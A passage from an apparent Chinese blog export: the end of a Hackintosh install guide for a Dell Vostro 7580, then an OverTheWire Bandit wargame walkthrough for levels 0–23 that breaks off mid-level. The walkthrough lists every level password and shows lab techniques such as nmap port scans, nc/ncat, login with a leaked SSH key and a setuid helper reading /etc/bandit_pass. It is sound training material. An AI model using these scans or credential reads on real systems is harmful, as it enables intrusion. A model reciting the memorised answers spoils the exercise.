<li>如果是 <a href="https://github.com/daliansky/Hackintosh">黑果小兵</a> 中维护的机型那直接去下载使用对应机型的引导</li>
<li>本方法需要下载原版镜像，如果有Macbook或已经装上了黑果那可以直接在Appstore下载，如果无那请参考其他博客😅<ul>
<li>可以试试用 Etcher 把网上冲浪得到的原版dmg镜像写入U盘（未尝试，仅猜测</li>
<li>（太久了咱也忘记了当时折腾过啥了</li>
</ul>
</li>
<li>本方法安装的是 macOS CataLina，新版的系统没有尝试过（猜测行不通</li>
<li>采用 OC 引导，本机机型整理好的OC引导<a href="https://github.com/ex7l0it/OC_vostro7580">这里下载</a></li>
</ol>
</blockquote>
<h2 id="折腾思路"><a href="#折腾思路" class="headerlink" title="折腾思路"></a>折腾思路</h2><ol>
<li>在黑果小兵的 <a href="https://github.com/daliansky/Hackintosh">Hackintosh 黑苹果长期维护机型 EFI 及安装教程整理</a> 找自己的笔记本机型，如果有那恭喜，直接点链接下载使用就好</li>
<li>如果无，那弄清楚自己笔记本的各种配置信息，带着配置在github上搜或者在上一步长期维护清单上找配置基本一致的引导，整下来试一试</li>
<li>如果不行或者还是搜不到，那就只能一个一个配置的去搜了，然后费时费力手动拼凑</li>
</ol>
<h2 id="最终成果"><a href="#最终成果" class="headerlink" title="最终成果"></a>最终成果</h2><p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201003192556535.png" alt="image-20201003192556535"></p>
<h2 id="OC-引导"><a href="#OC-引导" class="headerlink" title="OC 引导"></a>OC 引导</h2><p>主要使用 Dell-Inspiron7590 的OC引导：</p>
<p><a href="https://github.com/Pinming/Dell-Inspiron-7590-Hackintosh-Opencore/">https://github.com/Pinming/Dell-Inspiron-7590-Hackintosh-Opencore/</a></p>
<p>使用此EFI文件可驱动本机的UHD Graphics 630显卡、Intel Wireless-AC 9462无线网卡、蓝牙、触摸板，不可驱动声卡和有线网卡</p>
<h3 id="声卡驱动修复"><a href="#声卡驱动修复" class="headerlink" title="声卡驱动修复"></a>声卡驱动修复</h3><p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201002151234556.png" alt="image-20201002151234556"></p>
<p>修复声卡无法驱动方法：</p>
<p><strong>方法1：</strong></p>
<p>删除 Apple.kext，换用 VoodooHDA.kext</p>
<p>这里参考的是与本机有相同声卡型号的Huawei Matebook X Pro的OC引导文件中的相关文件与配置</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201006093903582.png" alt="image-20201006093903582"></p>
<p>存在的问题：</p>
<ol>
<li>整体音量较小</li>
<li>耳机插入后音质极差，存在爆音</li>
</ol>
<p><strong>方法2：</strong></p>
<p>声卡注入：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201019231832905.png" alt="image-20201019231832905"></p>
<h3 id="有线网卡驱动修复"><a href="#有线网卡驱动修复" class="headerlink" title="有线网卡驱动修复"></a>有线网卡驱动修复</h3><p>添加 AtherosE2200Ethernet.kext 驱动</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201006093656333.png" alt="image-20201006093656333"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201006105537885.png" alt="image-20201006105537885"></p>
<p><strong>整理后的OC引导：<a href="https://github.com/ex7l0it/OC_vostro7580">https://github.com/ex7l0it/OC_vostro7580</a></strong></p>
<h3 id="OC-引导安装"><a href="#OC-引导安装" class="headerlink" title="OC 引导安装"></a>OC 引导安装</h3><p>这里直接将引导安装到电脑硬盘上，在PE中使用DiskGenius把OC引导的文件夹扔进ESP分区的 EFI 文件夹里即可，开机时 F12 选择 OC 即可</p>
<ul>
<li>如果识别不到引导<ul>
<li>可以使用 easyUEFI 添加引导</li>
</ul>
</li>
</ul>
<blockquote>
<p>更新时备注：再具体的操作问题已经忘记了，问题不大，慢慢折腾总会成功的</p>
</blockquote>
<h2 id="制作安装U盘"><a href="#制作安装U盘" class="headerlink" title="制作安装U盘"></a>制作安装U盘</h2><p>参考：<a href="https://www.jianshu.com/p/5255971c6eeb">https://www.jianshu.com/p/5255971c6eeb</a></p>
<p>去 AppStore 下载macOS CataLina 10.15.7的安装镜像</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201005165523815.png" alt="image-20201005165523815"></p>
<p>等待下载完成，这个时间先把U盘格式化：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201005165637898.png" alt="image-20201005165637898"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201005165837145.png" alt="image-20201005165837145"></p>
<p>下载完成后，不要点继续，打开终端敲命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo /Applications/Install\ macOS\ Catalina.app/Contents/Resources/createinstallmedia --volume /Volumes/macOS</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201005165915030.png" alt="image-20201005165915030"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201005165933359.png" alt="image-20201005165933359"></p>
<p>等待写入完成</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20201005173449412.png" alt="image-20201005173449412"></p>
<h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><p>软件资源站：<del><a href="https://www.macwk.com/">https://www.macwk.com/</a></del></p>
<blockquote>
<p>更新时备注：已经无了</p>
</blockquote>
<h3 id="Command-Line-Developer-Tools-下载安装"><a href="#Command-Line-Developer-Tools-下载安装" class="headerlink" title="Command Line Developer Tools 下载安装"></a>Command Line Developer Tools 下载安装</h3><p><a href="https://developer.apple.com/download/more/">https://developer.apple.com/download/more/</a></p>
<h3 id="HomeBrew-安装"><a href="#HomeBrew-安装" class="headerlink" title="HomeBrew 安装"></a>HomeBrew 安装</h3><p>安装脚本：<a href="https://raw.githubusercontent.com/Homebrew/install/master/install.sh">https://raw.githubusercontent.com/Homebrew/install/master/install.sh</a></p>
<p>下载速度太慢解决方法：<a href="https://www.jianshu.com/p/c7c7aa34e579">https://www.jianshu.com/p/c7c7aa34e579</a></p>
]]></content>
      <categories>
        <category>macOS</category>
      </categories>
      <tags>
        <tag>Tutorial</tag>
        <tag>hackintosh</tag>
      </tags>
  </entry>
  <entry>
    <title>OverTheWire-Bandit 靶场</title>
    <url>/2020/02/07/OverTheWire-Bandit/</url>
    <content><![CDATA[<h1 id="OverTheWire-Bandit-靶场"><a href="#OverTheWire-Bandit-靶场" class="headerlink" title="OverTheWire Bandit 靶场"></a>OverTheWire Bandit 靶场</h1><p><a href="https://overthewire.org/wargames/bandit">https://overthewire.org/wargames/bandit</a></p>
<h2 id="Level-0"><a href="#Level-0" class="headerlink" title="Level 0"></a>Level 0</h2><blockquote>
<p>The goal of this level is for you to log into the game using SSH. The host to which you need to connect is <strong>bandit.labs.overthewire.org</strong>, on port 2220. The username is <strong>bandit0</strong> and the password is <strong>bandit0</strong>. Once logged in, go to the <a href="https://overthewire.org/wargames/bandit/bandit1.html">Level 1</a> page to find out how to beat Level 1.</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh bandit0@bandit.labs.overthewire.org -p 2220</span><br><span class="line">cat readme</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200206220345257.png" alt="image-20200206220345257"></p>
<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">boJ9jbbUNNfktd78OOpsqOltutMc3MY1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>The password for the next level is stored in a file called <strong>-</strong> located in the home directory</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat ./-</span><br></pre></td></tr></table></figure>

<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9</span><br></pre></td></tr></table></figure>

<blockquote>
<p>The password for the next level is stored in a file called <strong>spaces in this filename</strong> located in the home directory</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat &quot;spaces in this filename&quot;</span><br></pre></td></tr></table></figure>

<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK</span><br></pre></td></tr></table></figure>

<blockquote>
<p>The password for the next level is stored in a hidden file in the <strong>inhere</strong> directory.</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat ./inhere/.hidden</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207115316954.png" alt="image-20200207115316954"></p>
<h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pIwrPrtPN36QITSp3EQaw936yaFoFgAB</span><br></pre></td></tr></table></figure>

<blockquote>
<p>The password for the next level is stored in the only human-readable file in the <strong>inhere</strong> directory. Tip: if your terminal is messed up, try the “reset” command.</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat ./inhere/-file07</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207120610310.png" alt="image-20200207120610310"></p>
<h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><blockquote>
<p>Level Goal</p>
<p>The password for the next level is stored in a file somewhere under the <strong>inhere</strong> directory and has all of the following properties:</p>
<ul>
<li>human-readable</li>
<li>1033 bytes in size</li>
<li>not executable</li>
</ul>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">koReBOKuIDDepwhWk7jZC0RTdopnAYKh</span><br></pre></td></tr></table></figure>

<p>du 命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-a或-all 显示目录中个别文件的大小。</span><br><span class="line">-b或-bytes 显示目录或文件大小时，以byte为单位。</span><br><span class="line">-c或--total 除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和。</span><br><span class="line">-h或--human-readable 以K，M，G为单位，提高信息的可读性。</span><br><span class="line">-k或--kilobytes 以1024 bytes为单位。</span><br><span class="line">-l或--count-links 重复计算硬件连接的文件。</span><br><span class="line">-m或--megabytes 以1MB为单位。</span><br><span class="line">-s或--summarize 仅显示总计。</span><br><span class="line">-X&lt;文件&gt;或--exclude-from=&lt;文件&gt; 在&lt;文件&gt;指定目录或文件。</span><br><span class="line">--exclude=&lt;目录或文件&gt; 略过指定的目录或文件。</span><br><span class="line">--max-depth=&lt;目录层数&gt; 超过指定层数的目录后，予以忽略。</span><br></pre></td></tr></table></figure>

<p><img src="/XSS/image-20200207121629558.png" alt="image-20200207121629558"></p>
<h2 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h2><blockquote>
<p>The password for the next level is stored <strong>somewhere on the server</strong> and has all of the following properties:</p>
<ul>
<li>owned by user bandit7</li>
<li>owned by group bandit6</li>
<li>33 bytes in size</li>
</ul>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">DXjZPULLxYr17uwoI01bNLQbtFemEgo7</span><br></pre></td></tr></table></figure>

<p>find 命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-user 指定所有者</span><br><span class="line">-group 指定所在用户组</span><br><span class="line">-size 指定文件大小  c(byte) k(kb)</span><br></pre></td></tr></table></figure>

<p>错误信息隐藏：<code>2&gt;/dev/null</code></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207123201812.png" alt="image-20200207123201812"></p>
<h2 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h2><blockquote>
<p>The password for the next level is stored in the file <strong>data.txt</strong> next to the word <strong>millionth</strong></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi data.txt</span><br><span class="line">定位：</span><br><span class="line">/millionth</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207123910069.png" alt="image-20200207123910069"></p>
<p>或者利用 grep</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207124059889.png" alt="image-20200207124059889"></p>
<h2 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h2><blockquote>
<p>The password for the next level is stored in the file <strong>data.txt</strong> and is the only line of text that occurs only once</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cvX2JJa4CFALtqS87jk27qwqGhBM9plV</span><br></pre></td></tr></table></figure>

<p>sort命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">文本排序sort        </span><br><span class="line">sort -r  执行反方向（由上至下）整理                      </span><br><span class="line">sort -R  随机排序</span><br><span class="line">sort -n  执行数字大小整理               </span><br><span class="line">sort -f  选项忽略字符串中的字符大小写</span><br><span class="line">sort -u  删除输出中的重复行        </span><br><span class="line">sort -t  c 使用c作为定段界定符        </span><br><span class="line">sort -k  x 按照使用c分割的x整理并使用多次</span><br></pre></td></tr></table></figure>

<p>uniq命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uniq -c  显示没行重复出现的次数                       </span><br><span class="line">uniq -d  仅显示重复过的行</span><br><span class="line">uniq -u  仅显示不曾重复的行   连续且完全相同方为重复</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207125030652.png" alt="image-20200207125030652"></p>
<h2 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h2><blockquote>
<p>The password for the next level is stored in the file <strong>data.txt</strong> in one of the few human-readable strings, beginning with several ‘&#x3D;’ characters.</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207131245597.png" alt="image-20200207131245597"></p>
<h2 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h2><blockquote>
<p>The password for the next level is stored in the file <strong>data.txt</strong>, which contains base64 encoded data</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207131452886.png" alt="image-20200207131452886"></p>
<h2 id="Level-11"><a href="#Level-11" class="headerlink" title="Level 11"></a>Level 11</h2><blockquote>
<p>The password for the next level is stored in the file <strong>data.txt</strong>, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR</span><br></pre></td></tr></table></figure>

<p>Rot13编码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s=<span class="string">&quot;Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rot13_decode</span>(<span class="params">message</span>):</span><br><span class="line">    PAIRS = <span class="built_in">dict</span>(<span class="built_in">zip</span>(<span class="string">&quot;nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(PAIRS.get(c, c) <span class="keyword">for</span> c <span class="keyword">in</span> message)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rot13_decode(s))</span><br></pre></td></tr></table></figure>

<h2 id="Level-12"><a href="#Level-12" class="headerlink" title="Level 12"></a>Level 12</h2><blockquote>
<p>The password for the next level is stored in the file <strong>data.txt</strong>, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under &#x2F;tmp in which you can work using mkdir. For example: mkdir &#x2F;tmp&#x2F;myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!)</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu</span><br></pre></td></tr></table></figure>

<p>xxd 转换十六进制为二进制：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xxd -r file new_file</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207140936248.png" alt="image-20200207140936248"></p>
<p>重命名追加 .gz</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gzip -d old.gz</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207141028896.png" alt="image-20200207141028896"></p>
<p>重命名追加 .bz2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bzip2 -d old.bz2</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207141144691.png" alt="image-20200207141144691"></p>
<p>重命名追加 .gz，解压</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207141209611.png" alt="image-20200207141209611"></p>
<p>追加 .tar，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xf old.tar</span><br></pre></td></tr></table></figure>

<p>继续n重解压….</p>
<p>一直解压到 data8 得到密码</p>
<h2 id="Level-13"><a href="#Level-13" class="headerlink" title="Level 13"></a>Level 13</h2><blockquote>
<p>The password for the next level is stored in <strong>&#x2F;etc&#x2F;bandit_pass&#x2F;bandit14 and can only be read by user bandit14</strong>. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. <strong>Note:</strong> <strong>localhost</strong> is a hostname that refers to the machine you are working on</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL</span><br></pre></td></tr></table></figure>

<p>在用户当前用户家目录下有一个 <code>sshkey.private</code> 文件，保存到本地后利用它可登陆 bandit14 用户</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207144934481.png" alt="image-20200207144934481"></p>
<p>选择 public key 后点浏览-导入选择密钥文件，连接即可</p>
<p>或者是：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh bandit14@bandit.labs.overthewire.org -p 2220 -i ssh.key</span><br></pre></td></tr></table></figure>



<h2 id="Level-14"><a href="#Level-14" class="headerlink" title="Level 14"></a>Level 14</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</span><br></pre></td></tr></table></figure>

<blockquote>
<p>The password for the next level can be retrieved by submitting the password of the current level to <strong>port 30000 on localhost</strong>.</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc localhost 30000</span><br><span class="line">4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207145503314.png" alt="image-20200207145503314"></p>
<h2 id="Level-15"><a href="#Level-15" class="headerlink" title="Level 15"></a>Level 15</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">BfMYroe26WYalil77FoDi9qh59eK5xNr</span><br></pre></td></tr></table></figure>

<blockquote>
<p>The password for the next level can be retrieved by submitting the password of the current level to <strong>port 30001 on localhost</strong> using SSL encryption.</p>
<p><strong>Helpful note: Getting “HEARTBEATING” and “Read R BLOCK”? Use -ign_eof and read the “CONNECTED COMMANDS” section in the manpage. Next to ‘R’ and ‘Q’, the ‘B’ command also works in this version of that command…</strong></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ncat localhost 30001 --ssl</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207150432091.png" alt="image-20200207150432091"></p>
<h2 id="Level-16"><a href="#Level-16" class="headerlink" title="Level 16"></a>Level 16</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cluFn7wTiGryunymYOu4RcffSxQluehd</span><br></pre></td></tr></table></figure>

<blockquote>
<p>The credentials for the next level can be retrieved by submitting the password of the current level to <strong>a port on localhost in the range 31000 to 32000</strong>. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.</p>
</blockquote>
<p><code>nmap</code> 扫描指定端口：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -p31000-32000 127.0.0.1</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207150936853.png" alt="image-20200207150936853"></p>
<p>探测端口开放的服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -p31518,31790 -sV 127.0.0.1</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207152201483.png" alt="image-20200207152201483"></p>
<p>根据反馈结果判定是 31790 端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ncat localhost 31790 --ssl</span><br></pre></td></tr></table></figure>

<p>发送当前关密码得到下一关的登录密钥</p>
<h2 id="Level-17"><a href="#Level-17" class="headerlink" title="Level 17"></a>Level 17</h2><blockquote>
<p>There are 2 files in the homedirectory: <strong>passwords.old and passwords.new</strong>. The password for the next level is in <strong>passwords.new</strong> and is the only line that has been changed between <strong>passwords.old and passwords.new</strong></p>
<p><strong>NOTE: if you have solved this level and see ‘Byebye!’ when trying to log into bandit18, this is related to the next level, bandit19</strong></p>
</blockquote>
<p>diff 命令</p>
<p>比较文件的差异：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">diff passwords.old passwords.new</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207152951604.png" alt="image-20200207152951604"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207153111109.png" alt="image-20200207153111109"></p>
<h2 id="Level-18"><a href="#Level-18" class="headerlink" title="Level 18"></a>Level 18</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd</span><br></pre></td></tr></table></figure>

<blockquote>
<p>The password for the next level is stored in a file <strong>readme</strong> in the homedirectory. Unfortunately, someone has modified <strong>.bashrc</strong> to log you out when you log in with SSH.</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh bandit18@bandit.labs.overthewire.org -p 2220 &quot;cat readme&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207153632156.png" alt="image-20200207153632156"></p>
<h2 id="Level-19"><a href="#Level-19" class="headerlink" title="Level 19"></a>Level 19</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x</span><br></pre></td></tr></table></figure>

<blockquote>
<p>To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (&#x2F;etc&#x2F;bandit_pass), after you have used the setuid binary.</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207155850897.png" alt="image-20200207155850897"></p>
<p>该程序能够以bandit20的身份执行命令，查看密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">./bandit20-<span class="keyword">do</span> <span class="built_in">cat</span> /etc/bandit_pass/bandit20</span></span><br></pre></td></tr></table></figure>

<h2 id="Level-20"><a href="#Level-20" class="headerlink" title="Level 20"></a>Level 20</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GbKksEFF4yrVs6il55v6gwY5aVje5f0j</span><br></pre></td></tr></table></figure>

<blockquote>
<p>There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).</p>
<p><strong>NOTE:</strong> Try connecting to your own network daemon to see if it works as you think</p>
</blockquote>
<p><code>tmux</code> 常用快捷键：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Ctrl+B &quot; 横向分割窗口</span><br><span class="line">Ctrl+B % 纵向分割窗口</span><br><span class="line">Ctrl+B &amp; 确认后退出当前tmux</span><br><span class="line">Ctrl+B d 脱离当前会话</span><br></pre></td></tr></table></figure>



<p>一边用 <code>nc</code> 监听端口，另一边使用程序连接端口：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207161920525.png" alt="image-20200207161920525"></p>
<h2 id="Level-21"><a href="#Level-21" class="headerlink" title="Level 21"></a>Level 21</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</span><br></pre></td></tr></table></figure>

<blockquote>
<p>A program is running automatically at regular intervals from <strong>cron</strong>, the time-based job scheduler. Look in <strong>&#x2F;etc&#x2F;cron.d&#x2F;</strong> for the configuration and see what command is being executed.</p>
</blockquote>
<ol>
<li><p>进入<code>etc/cron.d</code> 目录：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207163750299.png" alt="image-20200207163750299"></p>
</li>
<li><p>查看 <code>cronjob_bandit22</code> 文件</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207163819469.png" alt="image-20200207163819469"></p>
</li>
<li><p>查看脚本文件：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207163840037.png" alt="image-20200207163840037"></p>
</li>
<li><p>该任务是将 bandit22 的密码写入 tmp 目录下一个文件中，读取即可得到密码</p>
</li>
</ol>
<h2 id="Level-22"><a href="#Level-22" class="headerlink" title="Level 22"></a>Level 22</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</span><br></pre></td></tr></table></figure>

<blockquote>
<p>A program is running automatically at regular intervals from <strong>cron</strong>, the time-based job scheduler. Look in <strong>&#x2F;etc&#x2F;cron.d&#x2F;</strong> for the configuration and see what command is being executed.</p>
<p><strong>NOTE:</strong> Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.</p>
</blockquote>
<p>同上，查看脚本：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207165229830.png" alt="image-20200207165229830"></p>
<p>分析获取文件名：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207165437670.png" alt="image-20200207165437670"></p>
<h2 id="Level-23"><a href="#Level-23" class="headerlink" title="Level 23"></a>Level 23</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</span><br></pre></td></tr></table></figure>

<blockquote>
<p>A program is running automatically at regular intervals from <strong>cron</strong>, the time-based job scheduler. Look in <strong>&#x2F;etc&#x2F;cron.d&#x2F;</strong> for the configuration and see what command is being executed.</p>
<p><strong>NOTE:</strong> This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!</p>
<p><strong>NOTE 2:</strong> Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…</p>
</blockquote>
<p>前部分操作一致，查看脚本：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207180648605.png" alt="image-20200207180648605"></p>
<p>复制上一关的脚本即可，在<code>/var/spool/bandit24</code> 目录下任意创建一个脚本文件，保存内容为：</p>
